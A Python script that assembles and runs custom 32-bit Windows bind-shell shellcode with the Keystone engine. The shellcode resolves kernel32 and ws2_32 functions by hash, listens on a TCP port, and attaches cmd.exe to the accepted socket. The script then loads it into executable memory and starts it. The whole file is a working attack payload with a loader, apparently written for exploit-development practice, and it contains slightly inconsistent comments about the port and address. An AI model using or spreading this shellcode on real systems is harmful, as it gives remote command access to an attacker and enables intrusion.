#!/usr/bin/python3

import ctypes, struct
from keystone import *

CODE = (
" start:				 "	#
"	int3				;"	# BREAKPOINT FOR WINDBG. REMOVE ME WHEN NOT DEBUGGING!!!!
"	mov	ebp, esp		;"	#
"	add	esp, 0xfffff9f0		;"	# Avoid NULL bytes		

" find_kernel32:			 "	#
"	xor	ecx, ecx 		;"   	# ECX = 0
"	mov	esi,fs:[ecx+30h]	;"	# ESI = &(PEB) ([FS:0x30])
"	mov	esi,[esi+0Ch]		;"   	# ESI = PEB->Ldr
"	mov	esi,[esi+1Ch]		;"   	# ESI = PEB->Ldr.InInitOrder

" next_module:				 "	#
"	mov	ebx, [esi+8h]		;"	# EBX = InInitOrder[X].base_address
"	mov	edi, [esi+20h]		;"	# EDI = InInitOrder[X].module_name
"	mov	esi, [esi]		;"	# ESI = InInitOrder[X].flink (next)
"	cmp	[edi+12*2], cx		;"	# (unicode) modulename[12] == 0x00?
"	jne	next_module		;"	# No: try next module.

" find_function_shorten:	 	   "	#
"	jmp 	find_function_shorten_bnc ;"	# Short jump

" find_function_ret:			  "	#
"	pop 	esi			 ;"	# POP the return address from the stack
"	mov	[ebp+0x04], esi		 ;"	# Save find_function address for later usage
"	jmp 	resolve_symbols_kernel32 ;" 	#

" find_function_shorten_bnc:		 "	#
"	call 	find_function_ret	;"	# Relative CALL with negative offset
	
" find_function:			 "	#	
"	pushad 				;"	# Save all registers
"	mov	eax, [ebx+0x3c]		;"	# Offset to PE Signature
" 	mov	edi, [ebx+eax+0x78]	;"	# Export Table Directory RVA
" 	add	edi, ebx		;"	# Export Table Directory VMA
"	mov	ecx, [edi+0x18]		;"	# NumberOfNames
" 	mov	eax, [edi+0x20]		;"	# AddressOfNames RVA
"	add	eax, ebx		;"	# AddressOfNames VMA
" 	mov	[ebp-4], eax		;"	# Save AddressOfNames VMA for later

" find_function_loop:			"	#	
"	jecxz 	find_function_finished	;"	# Jump to the end if ECX is 0
"	dec	ecx			;"	# Decrement our names counter
"	mov	eax, [ebp-4]		;"	# Restore AddressOfNames VMA
"	mov	esi, [eax+ecx*4]	;"	# Get the RVA of the symbol name
"	add	esi, ebx		;"	# Set ESI to the VMA of the current symbol name

" compute_hash:				"
"	xor	eax, eax		;"	# NULL EAX
"	cdq				;"	# NULL EDX
"	cld				;"	# Clear direction

" compute_hash_again:			"
"	lodsb				;"	# Load the next byte from esi into al
"	test 	al, al			;"	# Check for NULL terminator
"	jz	compute_hash_finished 	;"	# If the ZF is set, we've hit the NULL term
"	ror	edx, 0x0d		;"	# Rotate edx 13 bits to the right
"	add	edx, eax		;"	# Add the new byte to the accumulator
"	jmp	compute_hash_again	;"	# Next iteration

" compute_hash_finished:		" 	#

" find_function_compare:		" 	#
"	cmp	edx, [esp+0x24]		;"  	# Compare the computed hash with the requested hash
"	jnz	find_function_loop	;"  	# If it doesn't match go back to find_function_loop
"	mov	edx, [edi+0x24]		;" 	# AddressOfNameOrdinals RVA
"	add	edx, ebx		;" 	# AddressOfNameOrdinals VMA
"	mov	cx, [edx+2*ecx]		;"  	# Extrapolate the function's ordinal
"	mov	edx, [edi+0x1c]		;"  	# AddressOfFunctions RVA
"	add	edx, ebx		;"  	# AddressOfFunctions VMA
"	mov	eax, [edx+4*ecx]	;"  	# Get the function RVA
"	add	eax, ebx		;"  	# Get the function VMA
"	mov	[esp+0x1c], eax		;"  	# Overwrite stack version of eax from pushad
				
" find_function_finished:		"	#
"	popad				;"	# Restore registers
"	ret				;"	#

" resolve_symbols_kernel32:		"	#
"	push 	0x78b5b983		;"	# TerminateProcess Hash
"	call 	dword ptr [ebp+0x04]	;"	# Call find_function
"	mov	[ebp+0x10], eax		;"	# Save TerminateProcess address for later usage
"	push 	0xec0e4e8e		;"  	# LoadLibraryA hash
"	call 	dword ptr [ebp+0x04]	;"  	# Call find_function
"	mov	[ebp+0x14], eax		;"  	# Save LoadLibraryA address for later usage
"	push 	0x16b3fe72		;"  	# CreateProcessA hash
"	call 	dword ptr [ebp+0x04]	;"  	# Call find_function
"	mov	[ebp+0x18], eax		;"  	# Save CreateProcessA address for later usage

" load_ws2_32:				" 	#
"	xor	eax, eax		;" 	# Null EAX
"	mov	ax, 0x6c6c		;" 	# Move the end of the string in AX
"	push 	eax			;" 	# Push EAX on the stack with string NULL terminator
"	push 	0x642e3233		;" 	# Push part of the string on the stack
"	push 	0x5f327377		;" 	# Push another part of the string on the stack
"	push 	esp			;" 	# Push ESP to have a pointer to the string
"	call 	dword ptr [ebp+0x14]	;" 	# Call LoadLibraryA

" resolve_symbols_ws2_32:		"	#
"	mov	ebx, eax		;"	# Move the base address of ws2_32.dll to EBX
"	push 	0x3bfcedcb		;"	# WSAStartup hash
"	call 	dword ptr [ebp+0x04]	;"	# Call find_function
"	mov	[ebp+0x1C], eax		;"	# Save WSAStartup address for later usage
"	push 	0xadf509d9		;"	# WSASocketA hash
"	call 	dword ptr [ebp+0x04]	;"	# Call find_function
"	mov 	[ebp+0x20], eax		;"	# Save WSASocketA address for later usage
"	push 	0xc7701aa4		;"	# bind hash
"	call 	dword ptr [ebp+0x04]	;"	# Call find_function
"	mov 	[ebp+0x24], eax		;"	# Save bind address for later usage
"	push 	0xe92eada4		;"	# listen hash
"	call 	dword ptr [ebp+0x04]	;"	# Call find_function
"	mov 	[ebp+0x28], eax		;"	# Save listen address for later usage
"	push 	0x9f5b7976             	;"	# WSAGetLastError hash
"	call 	dword  [ebp+0x04]      	;"	# Call find_function
"	mov   	[ebp+0x32], eax       	;" 	# Save WSAGetLastError address for later usage
"	push 	0x498649e5		;"	# accept hash
"	call 	dword ptr [ebp+0x04]	;"	# Call find_function
"	mov 	[ebp+0x36], eax		;"	# Save accept address for later usage

" call_wsastartup:			"	#
"	mov	eax, esp		;"	# Move ESP to EAX
"	mov	cx, 0x590		;"	# Move 0x590 to CX
"	sub	eax, ecx		;"	# Subtract CX from EAX to avoid overwriting the structure later
"	push 	eax			;"	# Push lpWSAData
"	xor	eax, eax		;"	# Null EAX
"	mov	ax, 0x0202		;"	# Move version to AX
"	push 	eax			;"  	# Push wVersionRequired
"	call 	dword ptr [ebp+0x1C]	;"  	# Call WSAStartup

" call_wsasocketa:			"  	#
"	xor	eax, eax		;"  	# Null EAX
"	push 	eax			;"  	# Push dwFlags
"	push 	eax			;"  	# Push g
"	push 	eax			;" 	# Push lpProtocolInfo
"	mov	al, 0x06		;" 	# Move AL, IPPROTO_TCP
"	push  	eax			;" 	# Push protocol
"	sub	al, 0x05		;"  	# Subtract 0x05 from AL, AL = 0x01
"	push	eax			;"  	# Push type
"	inc	eax			;"  	# Increase EAX, EAX = 0x02
"	push 	eax			;"  	# Push af
"	call 	dword ptr [ebp+0x20]	;"  	# Call WSASocketA

" create_sockaddr_in_struct:     	"	# sockaddr_in {AF_INET = 2; p443 = 0x3905; INADDR_ANY = 0x5D00A8C0}
"	mov   	esi, eax              	;"	# Move the SOCKET descriptor to ESI
"	xor   	eax, eax             	;"	# EAX = Null
"	push 	eax                    	;"	# Push sin_addr (any address 0.0.0.0)
"	mov 	ax, 0x3905             	;"	# Move the sin_port (example: 1337) to AX (EAX = 0x00003905)   
"	shl   	eax, 0x10             	;"	# Left shift EAX by 0x10 bytes (EAX = 0x39050000)
"	add   	ax, 0x02              	;"	# Add 0x02 (AF_INET) to AX
"	push  	eax                   	;"	# Push sin_port & sin_family
"	push  	esp                   	;"	# Push pointer to the sockaddr_in structure
"	pop   	edi                   	;"	# EDI = &(sockaddr_in)

" call_bind:				"	# bind(SOCKET *s = ESI, const sockaddr *addr = EDI, int  namelen = 0x16)
"	xor	eax, eax		;"  	# Null EAX
"	add   	al, 0x16 		;"  	# Set AL to 0x16
"	push  	eax			;"  	# Push namelen
"	push  	edi			;"  	# Push *addr
"	push  	esi			;"  	# Push s
"	call 	dword ptr [ebp+0x24]	;"  	# Call bind

" call_listen:				"	#
"	xor	eax, eax		;"  	# Null EAX
"	push  	eax			;"	# Push backlog
"	push  	esi			;"  	# Push s
"	call 	dword ptr [ebp+0x28]	;"  	# Call listen

" call_accept:				"	#
"	xor	eax, eax		;"  	# Null EAX
"	push  	eax			;"  	# Push *addrlen (optional)
"	push  	eax			;"  	# Push *addr (optional)
"	push  	esi			;"  	# Push s
"	call 	dword ptr [ebp+0x36]	;"  	# Call accept

" create_startupinfoa:			"  	#
" 	mov	esi, eax		;"	# Save handle returned from accept() to ESI
"	push 	esi			;"  	# Push hStdError
"	push 	esi			;"  	# Push hStdOutput
"	push  	esi			;"  	# Push hStdInput
"	xor	eax, eax		;"  	# Null EAX
"	push	eax			;"  	# Push lpReserved2
"	push  	eax			;"  	# Push cbReserved2 & wShowWindow
"	mov 	al, 0x80		;"  	# Move 0x80 to AL
"	xor	ecx, ecx		;"  	# Null ECX
"	mov	cx, 0xffffff80		;"  	# Move 0xffffff80 to CX
"	neg	cx			;"	# change from -128 -> 128
"	add   	eax, ecx		;"  	# Set EAX to 0x100
"   	push 	eax			;"  	# Push dwFlags
"	xor	eax, eax		;"  	# Null EAX
"	push  	eax			;"  	# Push dwFillAttribute
"	push  	eax			;"  	# Push dwYCountChars
"	push  	eax			;"  	# Push dwXCountChars
"	push  	eax			;"  	# Push dwYSize
"	push  	eax			;"  	# Push dwXSize
"	push  	eax			;"  	# Push dwY
"	push  	eax			;"  	# Push dwX
"	push  	eax			;"  	# Push lpTitle
"	push  	eax			;"  	# Push lpDesktop
"	push  	eax			;"  	# Push lpReserved
"	mov	al, 0x44		;"  	# Move 0x44 to AL
"	push  	eax			;"  	# Push cb
"	push  	esp			;"  	# Push pointer to the STARTUPINFOA structure
"   	pop	edi			;"  	# Store pointer to STARTUPINFOA in EDI
" create_cmd_string:			"	# 		
"	mov	eax, 0xff9a879b		;"	# Move 0xff9a879b into EAX
"	neg	eax			;"	# Negate EAX, EAX = 00657865
"	push 	eax			;"	# Push part of the "cmd.exe" string
"	push 	0x2e646d63		;"	# Push the remainder of the "cmd.exe" string
"	push 	esp			;"	# Push pointer to the "cmd.exe" string
"	pop 	ebx			;"	# Store pointer to the "cmd.exe" string in EBX

" call_createprocessa:			"  	#
"	mov	eax, esp		;"  	# Move ESP to EAX
"	xor	ecx, ecx		;"  	# Null ECX
"	mov	cx, 0x390		;"  	# Move 0x390 to CX
"	sub	eax, ecx		;"  	# Subtract CX from EAX to avoid overwriting the structure later
"	push  	eax			;"  	# Push lpProcessInformation
"	push  	edi			;"  	# Push lpStartupInfo
"	xor	eax, eax		;" 	# Null EAX
"	push 	eax			;"  	# Push lpCurrentDirectory
"	push 	eax			;"  	# Push lpEnvironment
"	push  	eax			;"  	# Push dwCreationFlags
"	inc	eax			;"  	# Increase EAX, EAX = 0x01 (TRUE)
" 	push 	eax			;"  	# Push bInheritHandles
"	dec	eax			;"  	# Null EAX
"   	push  	eax			;"  	# Push lpThreadAttributes
"	push 	eax			;" 	# Push lpProcessAttributes
"   	push 	ebx			;"  	# Push lpCommandLine
" 	push 	eax			;"  	# Push lpApplicationName
"	call 	dword ptr [ebp+0x18]	;"  	# Call CreateProcessA

" terminate_process:			"	#
"	xor	ecx, ecx		;"	# Null ECX
"	push 	ecx			;"	# uExitCode
"	push 	0xffffffff		;"	# hProcess
"	call 	dword ptr [ebp+0x10]	;"	# Call TerminateProcess

#" call_wsagetlaserror:           	"	# WSAGetLastError() (just for debugging purpouse)
#"   call 	dword ptr [ebp+0x32]   ;"	# Call WSAGetLastError

)

# Initialize engine in x86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
	sh += struct.pack("B", e)
shellcode = bytearray(sh)

final = ""

final += 'shellcode = b"'

for enc in encoding:
    final += "\\x{0:02x}".format(enc)

final += '"'

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
	ctypes.c_int(len(shellcode)),
	ctypes.c_int(0x3000),
	ctypes.c_int(0x40))
	
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
	 buf,
	 ctypes.c_int(len(shellcode)))

print(final)
print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
	 ctypes.c_int(0),
	 ctypes.c_int(ptr),
	 ctypes.c_int(0),
	 ctypes.c_int(0),
	 ctypes.pointer(ctypes.c_int(0)))
																				 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))